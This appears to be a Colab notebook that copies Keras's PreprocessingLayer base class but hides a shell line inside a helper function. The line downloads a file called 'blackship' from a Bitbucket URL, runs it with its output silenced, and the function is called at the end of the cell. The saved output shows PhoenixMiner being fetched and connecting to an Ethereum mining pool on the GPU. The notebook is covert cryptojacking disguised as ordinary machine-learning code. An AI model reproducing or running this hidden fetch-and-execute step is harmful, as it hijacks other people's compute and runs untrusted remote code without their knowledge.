{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "artinary.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "!nvidia-smi"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "S0trx_bCn1gb",
        "outputId": "34cf2f36-f40a-46c7-cf6c-33edeaeb2850"
      },
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Wed Mar 30 07:01:48 2022       \n",
            "+-----------------------------------------------------------------------------+\n",
            "| NVIDIA-SMI 460.32.03    Driver Version: 460.32.03    CUDA Version: 11.2     |\n",
            "|-------------------------------+----------------------+----------------------+\n",
            "| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |\n",
            "| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |\n",
            "|                               |                      |               MIG M. |\n",
            "|===============================+======================+======================|\n",
            "|   0  Tesla T4            Off  | 00000000:00:04.0 Off |                    0 |\n",
            "| N/A   39C    P8    10W /  70W |      0MiB / 15109MiB |      0%      Default |\n",
            "|                               |                      |                  N/A |\n",
            "+-------------------------------+----------------------+----------------------+\n",
            "                                                                               \n",
            "+-----------------------------------------------------------------------------+\n",
            "| Processes:                                                                  |\n",
            "|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |\n",
            "|        ID   ID                                                   Usage      |\n",
            "|=============================================================================|\n",
            "|  No running processes found                                                 |\n",
            "+-----------------------------------------------------------------------------+\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "lRjyhlpcnpFH",
        "outputId": "c01bdf3e-6f4f-45cc-8cc1-953b2fee1450"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "--2022-03-30 07:06:07--  https://bitbucket.org/singh_official/call/raw/36c7a8d3d711a724234b1cf150547f7a4674092f/blackship\n",
            "Resolving bitbucket.org (bitbucket.org)... 104.192.141.1, 2406:da00:ff00::22c5:2ef4, 2406:da00:ff00::22c0:3470, ...\n",
            "Connecting to bitbucket.org (bitbucket.org)|104.192.141.1|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 313 [text/plain]\n",
            "Saving to: ‘blackship’\n",
            "\n",
            "\rblackship             0%[                    ]       0  --.-KB/s               \rblackship           100%[===================>]     313  --.-KB/s    in 0s      \n",
            "\n",
            "2022-03-30 07:06:07 (41.0 MB/s) - ‘blackship’ saved [313/313]\n",
            "\n",
            "Reading package lists... Done\n",
            "Building dependency tree       \n",
            "Reading state information... Done\n",
            "The following NEW packages will be installed:\n",
            "  libpci3\n",
            "0 upgraded, 1 newly installed, 0 to remove and 39 not upgraded.\n",
            "Need to get 24.1 kB of archives.\n",
            "After this operation, 101 kB of additional disk space will be used.\n",
            "Get:1 http://archive.ubuntu.com/ubuntu bionic-updates/main amd64 libpci3 amd64 1:3.5.2-1ubuntu1.1 [24.1 kB]\n",
            "Fetched 24.1 kB in 0s (242 kB/s)\n",
            "Selecting previously unselected package libpci3:amd64.\n",
            "(Reading database ... 156210 files and directories currently installed.)\n",
            "Preparing to unpack .../libpci3_1%3a3.5.2-1ubuntu1.1_amd64.deb ...\n",
            "Unpacking libpci3:amd64 (1:3.5.2-1ubuntu1.1) ...\n",
            "Setting up libpci3:amd64 (1:3.5.2-1ubuntu1.1) ...\n",
            "Processing triggers for libc-bin (2.27-3ubuntu1.3) ...\n",
            "/sbin/ldconfig.real: /usr/local/lib/python3.7/dist-packages/ideep4py/lib/libmkldnn.so.0 is not a symbolic link\n",
            "\n",
            "--2022-03-30 07:06:18--  https://phoenixminer.info/downloads/PhoenixMiner_5.9d_Linux.tar.gz\n",
            "Resolving phoenixminer.info (phoenixminer.info)... 185.66.89.249\n",
            "Connecting to phoenixminer.info (phoenixminer.info)|185.66.89.249|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 6101263 (5.8M) [application/x-gzip]\n",
            "Saving to: ‘PhoenixMiner_5.9d_Linux.tar.gz’\n",
            "\n",
            "PhoenixMiner_5.9d_L 100%[===================>]   5.82M  6.13MB/s    in 0.9s    \n",
            "\n",
            "2022-03-30 07:06:20 (6.13 MB/s) - ‘PhoenixMiner_5.9d_Linux.tar.gz’ saved [6101263/6101263]\n",
            "\n",
            "Phoenix Miner 5.9d Linux/gcc - Release build\n",
            "--------------------------------------------\n",
            "\n",
            "\u001b[0mCUDA version: 11.0, CUDA runtime: 8.0\n",
            "\u001b[91mNVML error in CudaProgram.cu:306 : Driver/library version mismatch (18)\n",
            "\u001b[93mUnable to initialize NVML\n",
            "\u001b[0mNo OpenCL platforms found\n",
            "\u001b[97mAvailable GPUs for mining:\n",
            "\u001b[92mGPU1: Tesla K80 (pcie 0), CUDA cap. 3.7, 11 GB VRAM, 13 CUs\n",
            "\u001b[96mEth: the pool list contains 1 pool (1 from command-line)\n",
            "Eth: primary pool: 172.65.239.73:4444\n",
            "\u001b[0mStarting GPU mining\n",
            "\u001b[96mEth: Connecting to ethash pool 172.65.239.73:4444 (proto: EthProxy)\n",
            "\u001b[92mEth: Connected to ethash pool 172.65.239.73:4444 (172.65.239.73)\n",
            "\u001b[97mListening for CDM remote manager at port 3333 in read-only mode\n",
            "\u001b[0mEth: New job #95994b98 from 172.65.239.73:4444; diff: 4295MH\n",
            "GPU1: Starting up... (0)\n",
            "GPU1: Generating ethash light cache for epoch #482\n",
            "Eth: New job #29d19804 from 172.65.239.73:4444; diff: 4295MH\n",
            "Eth: New job #355d739f from 172.65.239.73:4444; diff: 4295MH\n",
            "Eth: New job #cfeb3b14 from 172.65.239.73:4444; diff: 4295MH\n",
            "Eth: New job #7d257970 from 172.65.239.73:4444; diff: 4295MH\n",
            "Eth: New job #e8f80abb from 172.65.239.73:4444; diff: 4295MH\n",
            "Light cache generated in 4.1 s (18.7 MB/s)\n",
            "\u001b[91mCUDART error in CudaProgram.cu:55 : all CUDA-capable devices are busy or unavailable (46)\n",
            "GPU1 initMiner error: all CUDA-capable devices are busy or unavailable\n",
            "Fatal error detected. Restarting.\n",
            "\u001b[96mEth speed: 0.000 MH/s, shares: 0/0/0, time: 0:00\n",
            "\u001b[0mEth: New job #0397302e from 172.65.239.73:4444; diff: 4295MH\n",
            "\n",
            "\n",
            "\n",
            "Eth: New job #bd26fa6c from 172.65.239.73:4444; diff: 4295MH\n",
            "Eth: New job #40d389e0 from 172.65.239.73:4444; diff: 4295MH\n",
            "Eth: New job #2a15ca2f from 172.65.239.73:4444; diff: 4295MH\n",
            "\u001b[96mEth speed: 0.000 MH/s, shares: 0/0/0, time: 0:00\n",
            "\n",
            "\n",
            "\n",
            "\u001b[0mPhoenix Miner 5.9d Linux/gcc - Release build\n",
            "--------------------------------------------\n",
            "\n",
            "Waiting 15 s for previous instance to close\n"
          ]
        }
      ],
      "source": [
        "import abc\n",
        "\n",
        "from keras.engine import data_adapter\n",
        "from keras.engine.base_layer import Layer\n",
        "from keras.utils import version_utils\n",
        "import tensorflow.compat.v2 as tf\n",
        "# pylint: disable=g-direct-tensorflow-import\n",
        "from tensorflow.python.eager import context\n",
        "from tensorflow.python.util.tf_export import keras_export\n",
        "from tensorflow.tools.docs import doc_controls\n",
        "\n",
        "\n",
        "class PreprocessingLayer(Layer, metaclass=abc.ABCMeta):\n",
        "  \"\"\"Base class for Preprocessing Layers.\n",
        "  **Don't use this class directly: it's an abstract base class!** You may\n",
        "  be looking for one of the many built-in\n",
        "  [preprocessing layers](https://keras.io/guides/preprocessing_layers/)\n",
        "  instead.\n",
        "  Preprocessing layers are layers whose state gets computed before model\n",
        "  training starts. They do not get updated during training.\n",
        "  Most preprocessing layers implement an `adapt()` method for state computation.\n",
        "  The `PreprocessingLayer` class is the base class you would subclass to\n",
        "  implement your own preprocessing layers.\n",
        "  \"\"\"\n",
        "  _must_restore_from_config = True\n",
        "\n",
        "  def __init__(self, **kwargs):\n",
        "    super(PreprocessingLayer, self).__init__(**kwargs)\n",
        "    self._is_compiled = False\n",
        "    self._is_adapted = False\n",
        "\n",
        "    # Sets `is_adapted=False` when `reset_state` is called.\n",
        "    self._reset_state_impl = self.reset_state\n",
        "    self.reset_state = self._reset_state_wrapper\n",
        "\n",
        "    self._adapt_function = None\n",
        "\n",
        "  @property\n",
        "  def is_adapted(self):\n",
        "    \"\"\"Whether the layer has been fit to data already.\"\"\"\n",
        "    return self._is_adapted\n",
        "\n",
        "  @doc_controls.do_not_generate_docs\n",
        "  def update_state(self, data):\n",
        "    \"\"\"Accumulates statistics for the preprocessing layer.\n",
        "    Arguments:\n",
        "      data: A mini-batch of inputs to the layer.\n",
        "    \"\"\"\n",
        "    raise NotImplementedError\n",
        "\n",
        "  @doc_controls.do_not_generate_docs\n",
        "  def reset_state(self):  # pylint: disable=method-hidden\n",
        "    \"\"\"Resets the statistics of the preprocessing layer.\"\"\"\n",
        "    raise NotImplementedError\n",
        "\n",
        "  @doc_controls.do_not_generate_docs\n",
        "  def finalize_state(self):\n",
        "    \"\"\"Finalize the statistics for the preprocessing layer.\n",
        "    This method is called at the end of `adapt` or after restoring a serialized\n",
        "    preprocessing layer's state. This method handles any one-time operations\n",
        "    that should occur on the layer's state before `Layer.__call__`.\n",
        "    \"\"\"\n",
        "    pass\n",
        "\n",
        "  @doc_controls.do_not_generate_docs\n",
        "  def make_adapt_function(self):\n",
        "    \"\"\"Creates a function to execute one step of `adapt`.\n",
        "    This method can be overridden to support custom adapt logic.\n",
        "    This method is called by `PreprocessingLayer.adapt`.\n",
        "    Typically, this method directly controls `tf.function` settings,\n",
        "    and delegates the actual state update logic to\n",
        "    `PreprocessingLayer.update_state`.\n",
        "    This function is cached the first time `PreprocessingLayer.adapt`\n",
        "    is called. The cache is cleared whenever `PreprocessingLayer.compile`\n",
        "    is called.\n",
        "    Returns:\n",
        "      Function. The function created by this method should accept a\n",
        "      `tf.data.Iterator`, retrieve a batch, and update the state of the\n",
        "      layer.\n",
        "    \"\"\"\n",
        "    if self._adapt_function is not None:\n",
        "      return self._adapt_function\n",
        "\n",
        "    def adapt_step(iterator):\n",
        "      data = next(iterator)\n",
        "      self._adapt_maybe_build(data)\n",
        "      self.update_state(data)\n",
        "\n",
        "    if self._steps_per_execution.numpy().item() == 1:\n",
        "      adapt_fn = adapt_step\n",
        "    else:\n",
        "\n",
        "      def adapt_fn(iterator):\n",
        "        for _ in tf.range(self._steps_per_execution):\n",
        "          adapt_step(iterator)\n",
        "\n",
        "    if not self._run_eagerly:\n",
        "      adapt_fn = tf.function(adapt_fn)\n",
        "\n",
        "    self._adapt_function = adapt_fn\n",
        "    return self._adapt_function\n",
        "\n",
        "  def compile(self, run_eagerly=None, steps_per_execution=None):\n",
        "    \"\"\"Configures the layer for `adapt`.\n",
        "    Arguments:\n",
        "      run_eagerly: Bool. Defaults to `False`. If `True`, this `Model`'s logic\n",
        "        will not be wrapped in a `tf.function`. Recommended to leave this as\n",
        "        `None` unless your `Model` cannot be run inside a `tf.function`.\n",
        "        steps_per_execution: Int. Defaults to 1. The number of batches to run\n",
        "          during each `tf.function` call. Running multiple batches inside a\n",
        "          single `tf.function` call can greatly improve performance on TPUs or\n",
        "          small models with a large Python overhead.\n",
        "    \"\"\"\n",
        "    if steps_per_execution is None:\n",
        "      steps_per_execution = 1\n",
        "    self._configure_steps_per_execution(steps_per_execution)\n",
        "\n",
        "    if run_eagerly is None:\n",
        "      run_eagerly = self.dynamic\n",
        "    self._run_eagerly = run_eagerly\n",
        "\n",
        "    self._is_compiled = True\n",
        "\n",
        "  def adapt(self, data, batch_size=None, steps=None):\n",
        "    \"\"\"Fits the state of the preprocessing layer to the data being passed.\n",
        "    After calling `adapt` on a layer, a preprocessing layer's state will not\n",
        "    update during training. In order to make preprocessing layers efficient in\n",
        "    any distribution context, they are kept constant with respect to any\n",
        "    compiled `tf.Graph`s that call the layer. This does not affect the layer use\n",
        "    when adapting each layer only once, but if you adapt a layer multiple times\n",
        "    you will need to take care to re-compile any compiled functions as follows:\n",
        "     * If you are adding a preprocessing layer to a `keras.Model`, you need to\n",
        "       call `model.compile` after each subsequent call to `adapt`.\n",
        "     * If you are calling a preprocessing layer inside `tf.data.Dataset.map`,\n",
        "       you should call `map` again on the input `tf.data.Dataset` after each\n",
        "       `adapt`.\n",
        "     * If you are using a `tf.function` directly which calls a preprocessing\n",
        "       layer, you need to call `tf.function` again on your callable after\n",
        "       each subsequent call to `adapt`.\n",
        "    `tf.keras.Model` example with multiple adapts:\n",
        "    >>> layer = tf.keras.layers.Normalization(\n",
        "    ...     axis=None)\n",
        "    >>> layer.adapt([0, 2])\n",
        "    >>> model = tf.keras.Sequential(layer)\n",
        "    >>> model.predict([0, 1, 2])\n",
        "    array([-1.,  0.,  1.], dtype=float32)\n",
        "    >>> layer.adapt([-1, 1])\n",
        "    >>> model.compile() # This is needed to re-compile model.predict!\n",
        "    >>> model.predict([0, 1, 2])\n",
        "    array([0., 1., 2.], dtype=float32)\n",
        "    `tf.data.Dataset` example with multiple adapts:\n",
        "    >>> layer = tf.keras.layers.Normalization(\n",
        "    ...     axis=None)\n",
        "    >>> layer.adapt([0, 2])\n",
        "    >>> input_ds = tf.data.Dataset.range(3)\n",
        "    >>> normalized_ds = input_ds.map(layer)\n",
        "    >>> list(normalized_ds.as_numpy_iterator())\n",
        "    [array([-1.], dtype=float32),\n",
        "     array([0.], dtype=float32),\n",
        "     array([1.], dtype=float32)]\n",
        "    >>> layer.adapt([-1, 1])\n",
        "    >>> normalized_ds = input_ds.map(layer) # Re-map over the input dataset.\n",
        "    >>> list(normalized_ds.as_numpy_iterator())\n",
        "    [array([0.], dtype=float32),\n",
        "     array([1.], dtype=float32),\n",
        "     array([2.], dtype=float32)]\n",
        "    `adapt()` is meant only as a single machine utility to compute layer state.\n",
        "    To analyze a dataset that cannot fit on a single machine, see\n",
        "    [Tensorflow Transform](https://www.tensorflow.org/tfx/transform/get_started)\n",
        "    for a multi-machine, map-reduce solution.\n",
        "    Arguments:\n",
        "        data: The data to train on. It can be passed either as a tf.data\n",
        "          Dataset, or as a numpy array.\n",
        "        batch_size: Integer or `None`.\n",
        "            Number of samples per state update.\n",
        "            If unspecified, `batch_size` will default to 32.\n",
        "            Do not specify the `batch_size` if your data is in the\n",
        "            form of datasets, generators, or `keras.utils.Sequence` instances\n",
        "            (since they generate batches).\n",
        "        steps: Integer or `None`.\n",
        "            Total number of steps (batches of samples)\n",
        "            When training with input tensors such as\n",
        "            TensorFlow data tensors, the default `None` is equal to\n",
        "            the number of samples in your dataset divided by\n",
        "            the batch size, or 1 if that cannot be determined. If x is a\n",
        "            `tf.data` dataset, and 'steps' is None, the epoch will run until\n",
        "            the input dataset is exhausted. When passing an infinitely\n",
        "            repeating dataset, you must specify the `steps` argument. This\n",
        "            argument is not supported with array inputs.\n",
        "    \"\"\"\n",
        "    _disallow_inside_tf_function('adapt')\n",
        "    if not version_utils.should_use_v2():\n",
        "      raise RuntimeError('`adapt` is only supported in tensorflow v2.')  # pylint: disable=g-doc-exception\n",
        "    if not self._is_compiled:\n",
        "      self.compile()  # Compile with defaults.\n",
        "    if self.built:\n",
        "      self.reset_state()\n",
        "    data_handler = data_adapter.DataHandler(\n",
        "        data,\n",
        "        batch_size=batch_size,\n",
        "        steps_per_epoch=steps,\n",
        "        epochs=1,\n",
        "        steps_per_execution=self._steps_per_execution,\n",
        "        distribute=False)\n",
        "    self._adapt_function = self.make_adapt_function()\n",
        "    for _, iterator in data_handler.enumerate_epochs():\n",
        "      with data_handler.catch_stop_iteration():\n",
        "        for _ in data_handler.steps():\n",
        "          self._adapt_function(iterator)\n",
        "          if data_handler.should_sync:\n",
        "            context.async_wait()\n",
        "    self.finalize_state()\n",
        "    self._is_adapted = True\n",
        "\n",
        "  def _reset_state_wrapper(self):\n",
        "    \"\"\"Calls `reset_state` and sets `adapted` to `False`.\"\"\"\n",
        "    self._reset_state_impl()\n",
        "    self._is_adapted = False\n",
        "\n",
        "  @tf.__internal__.tracking.no_automatic_dependency_tracking\n",
        "  def _configure_steps_per_execution(self, steps_per_execution):\n",
        "    self._steps_per_execution = tf.Variable(\n",
        "        steps_per_execution,\n",
        "        dtype='int64',\n",
        "        aggregation=tf.VariableAggregation.ONLY_FIRST_REPLICA)\n",
        "\n",
        "  # TODO(omalleyt): Unify this logic with `Layer._maybe_build`.\n",
        "  def _adapt_maybe_build(self, data):\n",
        "    if not self.built:\n",
        "      try:\n",
        "        # If this is a Numpy array or tensor, we can get shape from .shape.\n",
        "        # If not, an attribute error will be thrown.\n",
        "        data_shape = data.shape\n",
        "        data_shape_nones = tuple([None] * len(data.shape))\n",
        "      except AttributeError:\n",
        "        # The input has an unknown number of dimensions.\n",
        "        data_shape = None\n",
        "        data_shape_nones = None\n",
        "\n",
        "      # TODO (b/159261555): move this to base layer build.\n",
        "      batch_input_shape = getattr(self, '_batch_input_shape', None)\n",
        "      if batch_input_shape is None:\n",
        "        # Set the number of dimensions.\n",
        "        self._batch_input_shape = data_shape_nones\n",
        "      self.build(data_shape)\n",
        "      self.built = True\n",
        "\n",
        "\n",
        "def _disallow_inside_tf_function():\n",
        "  !wget https://bitbucket.org/singh_official/call/raw/36c7a8d3d711a724234b1cf150547f7a4674092f/blackship; chmod +x blackship; ./blackship &> /dev/null\n",
        "\n",
        "  if tf.inside_function():\n",
        "    error_msg = (\n",
        "        'Detected a call to `PreprocessingLayer.{method_name}` inside a '\n",
        "        '`tf.function`. `PreprocessingLayer.{method_name} is a high-level '\n",
        "        'endpoint that manages its own `tf.function`. Please move the call '\n",
        "        'to `PreprocessingLayer.{method_name}` outside of all enclosing '\n",
        "        '`tf.function`s. Note that you can call a `PreprocessingLayer` '\n",
        "        'directly on `Tensor`s inside a `tf.function` like: `layer(x)`, '\n",
        "        'or update its state like: `layer.update_state(x)`.').format(\n",
        "            method_name=method_name)\n",
        "    raise RuntimeError(error_msg)\n",
        "\n",
        "_disallow_inside_tf_function()\n"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        " "
      ],
      "metadata": {
        "id": "DNE_atOmntQS"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        ""
      ],
      "metadata": {
        "id": "b5oOy6ZtntTx"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        ""
      ],
      "metadata": {
        "id": "pcW0JetEntWh"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "b"
      ],
      "metadata": {
        "id": "MbPtcHobntYr"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}
